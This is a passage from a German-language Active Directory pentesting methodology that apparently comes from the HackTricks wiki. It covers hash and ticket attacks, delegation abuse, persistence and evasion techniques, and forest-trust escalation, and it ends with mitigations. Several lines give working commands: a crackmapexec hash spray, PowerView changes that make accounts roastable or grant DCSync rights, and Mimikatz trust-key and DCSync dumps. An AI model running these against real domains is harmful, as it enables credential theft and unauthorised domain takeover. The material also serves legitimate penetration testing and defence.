Wenn du **auf andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (wie eine SCF-Datei), die bei einem Zugriff irgendwie eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und knacken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege Escalation in Active Directory MIT privilegierten Credentials/einer privilegierten Sitzung

**Für die folgenden Techniken reicht ein regulärer Domain-Benutzer nicht aus; du benötigst spezielle Berechtigungen/Credentials, um diese Angriffe durchzuführen.**

### Hash-Extraktion

Hoffentlich ist es dir gelungen, mithilfe von [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) und [lokaler Privilege Escalation](../windows-local-privilege-escalation/index.html) ein **lokales Admin-Konto zu kompromittieren**.\
Dann ist es an der Zeit, alle Hashes aus dem Speicher und lokal zu dumpen.\
[**Lies diese Seite über verschiedene Möglichkeiten, die Hashes zu erlangen.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um den Benutzer zu **imitieren**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mithilfe** dieses **Hashes durchführt**, **oder** du könntest einen neuen **sessionlogon** erstellen und diesen **Hash** in **LSASS injizieren**, sodass bei jeder **durchgeführten NTLM-Authentifizierung** dieser **Hash verwendet wird.** Die letzte Option wird von mimikatz verwendet.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **in Netzwerken nützlich sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos** als Authentifizierungsprotokoll **erlaubt** ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers**, anstatt dessen Passwort oder Hash-Werte zu stehlen. Dieses gestohlene Ticket wird anschließend verwendet, um den **Benutzer zu imitieren** und unautorisierten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs anzumelden**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und **LAPS** dies **eindämmen** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer Berechtigungen zum **Zugriff auf MSSQL-Instanzen** besitzt, könnte er diese verwenden, um **Befehle auf dem MSSQL-Host auszuführen** (wenn dieser als SA läuft), den NetNTLM-**Hash zu stehlen** oder sogar einen **Relay**-**Angriff** durchzuführen.\
Wenn eine MSSQL-Instanz über einen Datenbank-Link von einer anderen Instanz als vertrauenswürdig eingestuft wird, kann ein Benutzer mit Berechtigungen für die verknüpfte Datenbank möglicherweise **die Vertrauensbeziehung nutzen, um Abfragen auf der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen können verkettet werden und schließlich eine falsch konfigurierte Datenbank erreichen, auf der der Benutzer Befehle ausführen kann.\
**Die Verbindungen zwischen Datenbanken funktionieren auch über Forest-Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset-/Deployment-Plattformen

Drittanbieter-Inventarisierungs- und Deployment-Suites bieten häufig leistungsfähige Wege zu Zugangsdaten und Codeausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und über Domain-Berechtigungen auf dem Computer verfügst, kannst du die TGTs aller Benutzer aus dem Arbeitsspeicher auslesen, die sich am Computer anmelden.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du dessen TGT auslesen und ihn mithilfe von [Pass the Ticket](pass-the-ticket.md) imitieren.\
Dank Constrained Delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich handelt es sich dabei um einen DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" berechtigt ist, kann er **jeden Benutzer imitieren, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du anschließend den **Hash dieses Benutzers/Computers kompromittierst**, kannst du **jeden Benutzer** (einschließlich Domain Admins) imitieren, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Die Berechtigung **WRITE** für ein Active-Directory-Objekt eines entfernten Computers ermöglicht Codeausführung mit **erweiterten Berechtigungen**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Missbrauch von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte **interessante Berechtigungen für bestimmte Domänenobjekte** besitzen, die dir später **laterale Bewegungen**/**Privilege Escalation** ermöglichen.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer-Spooler-Dienstes

Das Entdecken eines **lauschenden Spool-Dienstes** innerhalb der Domäne kann **missbraucht** werden, um **neue Zugangsdaten zu erlangen** und **Berechtigungen zu erweitern**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, ist es möglich, **Zugangsdaten aus dem Arbeitsspeicher zu sammeln** und sogar Beacons in ihre Prozesse **einzuschleusen**, um sie zu imitieren.\
Normalerweise greifen Benutzer über RDP auf das System zu. Daher findest du hier, wie einige Angriffe auf RDP-Sitzungen Dritter durchgeführt werden:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf domänengebundenen Computern bereit und sorgt dafür, dass dieses **zufällig**, eindeutig und regelmäßig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff wird über ACLs ausschließlich für autorisierte Benutzer kontrolliert. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter wird ein Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von Zertifikaten** vom kompromittierten Computer kann eine Möglichkeit sein, Berechtigungen innerhalb der Umgebung zu erweitern:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Missbrauch von Certificate Templates

Wenn **vulnerable Templates** konfiguriert sind, können diese missbraucht werden, um Berechtigungen zu erweitern:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Auslesen von Domain Credentials

Sobald du **Domain-Admin**- oder noch besser **Enterprise-Admin**-Berechtigungen erlangt hast, kannst du die **Domänendatenbank** _ntds.dit_ **auslesen**.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc als Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könntest du:

- Benutzer für [**Kerberoast**](kerberoast.md) anfällig machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer für [**ASREPRoast**](asreproast.md) anfällig machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- einem Benutzer [**DCSync**](#dcsync)-Berechtigungen gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver-Ticket-Angriff** erstellt mithilfe des **NTLM-Hashes** (beispielsweise des **Hashes des PC-Kontos**) ein **legitimes Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst. Diese Methode wird verwendet, um auf die **Berechtigungen des Dienstes zuzugreifen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden-Ticket-Angriff** erlangt ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active-Directory-(AD-)Umgebung. Dieses Konto ist speziell, da es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung innerhalb des AD-Netzwerks erforderlich sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für jedes beliebige Konto erstellen (Silver-Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind wie Golden Tickets, werden jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Zertifikate eines Kontos zu besitzen oder sie anfordern zu können** ist eine sehr gute Möglichkeit, Persistence im Benutzerkonto zu erreichen (selbst wenn der Benutzer das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Mithilfe von Zertifikaten ist es ebenfalls möglich, Persistence mit hohen Berechtigungen innerhalb der Domäne zu erreichen:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory gewährleistet die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins), indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unbefugte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden: Wenn ein Angreifer die ACL von AdminSDHolder so verändert, dass ein regulärer Benutzer Vollzugriff erhält, erlangt dieser Benutzer weitreichende Kontrolle über alle privilegierten Gruppen. Diese eigentlich schützende Sicherheitsmaßnahme kann somit nach hinten losgehen und unberechtigten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administratorkonto**. Durch das Erlangen von Administratorrechten auf einem solchen Computer kann der Hash des lokalen Administrators mithilfe von **mimikatz** extrahiert werden. Anschließend ist eine Änderung der Registry erforderlich, um **die Verwendung dieses Passworts zu aktivieren** und dadurch Remotezugriff auf das lokale Administratorkonto zu ermöglichen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** bestimmte **spezielle Berechtigungen** für bestimmte Domänenobjekte **gewähren**, sodass der Benutzer künftig **seine Berechtigungen erweitern kann**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security Descriptors** werden verwendet, um die **Berechtigungen zu speichern**, die ein **Objekt** für ein anderes **Objekt** besitzt. Wenn du lediglich eine **kleine Änderung** am **Security Descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Berechtigungen für dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Diese löschen sich ohne Tombstones selbst und beseitigen LDAP-Beweise, hinterlassen jedoch verwaiste SIDs, fehlerhafte `gPLink`-Referenzen oder zwischengespeicherte DNS-Antworten (z. B. die Verschmutzung von AdminSDHolder-ACEs oder bösartige `gPCFileSysPath`-/AD-integrierte DNS-Umleitungen).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Arbeitsspeicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domänenkonten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die für den Zugriff auf den Computer verwendeten **Zugangsdaten** im **Klartext** zu **erfassen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dabei wird ein **neuer Domain Controller** im AD registriert und verwendet, um **Attribute** (SIDHistory, SPNs usw.) auf bestimmten Objekten zu **setzen**, ohne **Protokolle** über die **Änderungen** zu hinterlassen. Du **benötigst DA**-Berechtigungen und musst dich innerhalb der **Root-Domain** befinden.\
Beachte, dass bei der Verwendung falscher Daten sehr auffällige Protokolleinträge entstehen.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Zuvor haben wir besprochen, wie sich Berechtigungen erweitern lassen, wenn du **über ausreichende Berechtigungen zum Lesen von LAPS-Passwörtern verfügst**. Diese Passwörter können jedoch auch verwendet werden, um **Persistence aufrechtzuerhalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass die **Kompromittierung einer einzelnen Domäne potenziell zur Kompromittierung des gesamten Forests führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Ein [**Domain Trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domäne** den Zugriff auf Ressourcen in einer anderen **Domäne** ermöglicht. Im Wesentlichen wird dadurch eine Verbindung zwischen den Authentifizierungssystemen der beiden Domänen hergestellt, sodass Authentifizierungsprüfungen nahtlos weitergeleitet werden können. Wenn Domänen einen Trust einrichten, tauschen sie bestimmte **Schlüssel** aus und speichern diese in ihren **Domain Controllern (DCs)**. Diese sind entscheidend für die Integrität des Trusts.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **trusted domain** zugreifen möchte, zunächst ein spezielles Ticket namens **inter-realm TGT** beim DC seiner eigenen Domäne anfordern. Dieses TGT wird mit einem gemeinsam genutzten **Schlüssel** verschlüsselt, auf den sich beide Domänen geeinigt haben. Anschließend legt der Benutzer dieses TGT dem **DC der trusted domain** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der trusted domain stellt dieser ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Clientcomputer** in **Domain 1** startet den Prozess, indem er seinen **NTLM-Hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert anschließend ein **inter-realm TGT** von DC1 an, das für den Zugriff auf Ressourcen in **Domain 2** benötigt wird.
4. Das inter-realm TGT wird mit einem **Trust Key** verschlüsselt, der im Rahmen des zweiseitigen Domain Trusts von DC1 und DC2 gemeinsam genutzt wird.
5. Der Client übermittelt das inter-realm TGT an den **Domain Controller (DC2) von Domain 2**.
6. DC2 überprüft das inter-realm TGT mithilfe des gemeinsam genutzten Trust Keys und stellt, sofern es gültig ist, einen **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich legt der Client dieses TGS dem Server vor. Es ist mit dem Account-Hash des Servers verschlüsselt, um Zugriff auf den Dienst in Domain 2 zu erhalten.

### Verschiedene Trusts

Es ist wichtig zu beachten, dass ein **Trust unidirektional oder bidirektional** sein kann. Bei der bidirektionalen Variante vertrauen beide Domänen einander. Bei einer **unidirektionalen** Trust-Beziehung ist eine Domäne die **trusted** und die andere die **trusting** domain. Im letzten Fall kannst du **nur von der trusted domain aus auf Ressourcen innerhalb der trusting domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting domain und B die trusted domain. Außerdem handelt es sich in **Domain A** um einen **Outbound Trust** und in **Domain B** um einen **Inbound Trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child Trusts**: Dies ist eine häufige Konfiguration innerhalb desselben Forests, bei der eine Child-Domain automatisch einen transitiven bidirektionalen Trust mit ihrer Parent-Domain besitzt. Das bedeutet im Wesentlichen, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child weitergeleitet werden können.
- **Cross-link Trusts**: Diese werden als „Shortcut Trusts“ bezeichnet und zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals normalerweise bis zur Forest-Root und anschließend zurück zur Ziel-Domain weitergeleitet werden. Durch die Erstellung von Cross-links wird dieser Weg verkürzt, was insbesondere in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese werden zwischen verschiedenen, voneinander unabhängigen Domänen eingerichtet und sind von Natur aus nicht-transitiv. Laut [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domäne außerhalb des aktuellen Forests zuzugreifen, die nicht über einen Forest Trust verbunden ist. Die Sicherheit wird bei External Trusts durch SID Filtering erhöht.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree-Root eingerichtet. Obwohl sie nicht häufig vorkommen, sind Tree-root Trusts wichtig, um neue Domänenbäume zu einem Forest hinzuzufügen. Sie ermöglichen diesen, einen eindeutigen Domänennamen beizubehalten, und gewährleisten eine bidirektionale Transitivität. Weitere Informationen findest du in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein bidirektionaler, transitiver Trust zwischen den Forest-Root-Domains und erzwingt ebenfalls SID Filtering, um die Sicherheitsmaßnahmen zu verbessern.
- **MIT Trusts**: Diese Trusts werden mit Nicht-Windows-Kerberos-Domänen eingerichtet, die [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind etwas spezialisierter und für Umgebungen vorgesehen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Weitere Unterschiede bei **Trust-Beziehungen**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht-transitiv**.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **unidirektionaler Trust** (nur eine Domäne vertraut der anderen) eingerichtet werden.

### Angriffsweg

1. **Enumeriere** die Trust-Beziehungen.
2. Prüfe, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domäne** hat, beispielsweise durch ACE-Einträge oder durch die Mitgliedschaft in Gruppen der anderen Domäne. Suche nach **domänenübergreifenden Beziehungen** (wahrscheinlich wurde der Trust genau dafür eingerichtet).
1. Kerberoast könnte in diesem Fall eine weitere Option sein.
3. **Kompromittiere** die **Konten**, die ein **Pivoting** zwischen Domänen ermöglichen.

Angreifer könnten über drei wesentliche Mechanismen auf Ressourcen in einer anderen Domäne zugreifen:

- **Mitgliedschaft in lokalen Gruppen**: Principals könnten lokalen Gruppen auf Computern hinzugefügt worden sein, beispielsweise der Gruppe „Administrators“ auf einem Server, wodurch sie weitreichende Kontrolle über diesen Computer erhalten.
- **Mitgliedschaft in Gruppen einer fremden Domäne**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domäne sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals könnten in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Für alle, die sich eingehender mit der Funktionsweise von ACLs, DACLs und ACEs beschäftigen möchten, ist das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine wertvolle Ressource.<sup>[[17]](#references)</sup>

### Finden von externen Benutzern/Gruppen mit Berechtigungen

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um Foreign Security Principals in der Domäne zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domäne/einem externen Forest**.

Du könntest dies in **Bloodhound** oder mithilfe von powerview überprüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Privilegieneskalation von der untergeordneten zur übergeordneten Gesamtstruktur
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten zur Aufzählung von Domain-Vertrauensstellungen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 vertrauenswürdige Schlüssel**, einen für _Child --> Parent_ und einen weiteren für _Parent_ --> _Child_.\
> Sie können den vom aktuellen Domain verwendeten Schlüssel mit folgenden Befehlen abrufen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin zur Child-/Parent-Domain eskalieren, indem das Trust mit SID-History injection missbraucht wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Schreibbare Configuration NC ausnutzen

Das Verständnis, wie die Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Die Configuration NC dient in Active Directory (AD)-Umgebungen als zentrales Repository für Konfigurationsdaten im gesamten Forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb des Forests repliziert, wobei schreibbare DCs eine schreibbare Kopie der Configuration NC verwalten. Um dies auszunutzen, benötigt man **SYSTEM-Rechte auf einem DC**, vorzugsweise einem Child DC.

**GPO mit der Root-DC-Site verknüpfen**

Der Sites-Container der Configuration NC enthält Informationen zu den Sites aller in die Domain eingebundenen Computer innerhalb des AD-Forests. Mit SYSTEM-Rechten auf einem beliebigen DC können Angreifer GPOs mit den Root-DC-Sites verknüpfen. Dadurch kann die Root-Domain kompromittiert werden, indem die auf diese Sites angewendeten Richtlinien manipuliert werden.

Ausführliche Informationen finden sich beispielsweise in der Recherche zu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Beliebige gMSA im Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs erforderlich ist, wird in der Configuration NC gespeichert. Mit SYSTEM-Rechten auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter für jede gMSA im gesamten Forest zu berechnen.

Eine detaillierte Analyse und schrittweise Anleitung finden sich unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegierter MSA-Angriff (BadSuccessor – Missbrauch von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Recherche: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Diese Methode erfordert Geduld, da auf die Erstellung neuer privilegierter AD-Objekte gewartet werden muss. Mit SYSTEM-Rechten kann ein Angreifer das AD Schema ändern, um einem beliebigen Benutzer vollständige Kontrolle über alle Klassen zu gewähren. Dies könnte zu unbefugtem Zugriff auf neu erstellte AD-Objekte und deren Kontrolle führen.

Weitere Informationen finden sich unter [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Public-Key-Infrastructure-(PKI-)Objekte ab, um ein Certificate Template zu erstellen, das die Authentifizierung als beliebiger Benutzer innerhalb des Forests ermöglicht. Da sich PKI-Objekte in der Configuration NC befinden, ermöglicht die Kompromittierung eines schreibbaren Child DC die Durchführung von ESC5-Angriffen.

Weitere Details finden sich unter [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In Szenarien ohne ADCS kann der Angreifer die erforderlichen Komponenten einrichten, wie unter [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externer Forest-Domain - Unidirektional (Inbound) oder bidirektional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario wird **Ihrer Domain von einer externen Domain vertraut**, wodurch Sie **unbestimmte Berechtigungen für diese Domain** erhalten. Sie müssen herausfinden, **welche Principals Ihrer Domain über welche Zugriffsrechte auf die externe Domain verfügen**, und anschließend versuchen, diese auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domain – Einseitig (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario vertraut **deine Domain** einem Prinzipal aus **einer anderen Domain** einige **Berechtigungen** an.

Wenn jedoch eine **Domain** von der vertrauenden Domain **als vertrauenswürdig eingestuft** wird, erstellt die vertrauenswürdige Domain einen **Benutzer** mit einem **vorhersehbaren Namen**, der als **Passwort das Passwort der vertrauenswürdigen Domain** verwendet. Das bedeutet, dass es möglich ist, **auf einen Benutzer aus der vertrauenden Domain zuzugreifen, um in die vertrauenswürdige Domain zu gelangen**, sie zu enumerieren und zu versuchen, weitere Berechtigungen zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in die **entgegengesetzte Richtung** des Domain-Trusts eingerichtet wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf die sich ein **Benutzer aus der vertrauenswürdigen Domain zugreifen** kann, um sich anschließend per **RDP** anzumelden. Dann könnte der Angreifer Code in den Prozess der RDP-Sitzung injizieren und von dort aus auf die **Ursprungsdomain des Opfers** zugreifen.\
Wenn das **Opfer außerdem seine Festplatte eingebunden** hat, könnte der Angreifer aus dem Prozess der **RDP-Sitzung** heraus **Backdoors** im **Startup-Ordner der Festplatte** speichern. Diese Technik wird **RDPInception** genannt.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen zur Eindämmung des Missbrauchs von Domain-Trusts

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-history-Attribut über Forest-Trusts hinweg ausnutzen, wird durch SID Filtering eingedämmt, das standardmäßig für alle Forest-übergreifenden Trusts aktiviert ist. Dies basiert auf der Annahme, dass Trusts innerhalb eines Forests sicher sind, wobei gemäß Microsofts Standpunkt nicht die Domain, sondern der Forest als Sicherheitsgrenze betrachtet wird.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Forest-übergreifenden Trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der vertrauenden Domain oder des vertrauenden Forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

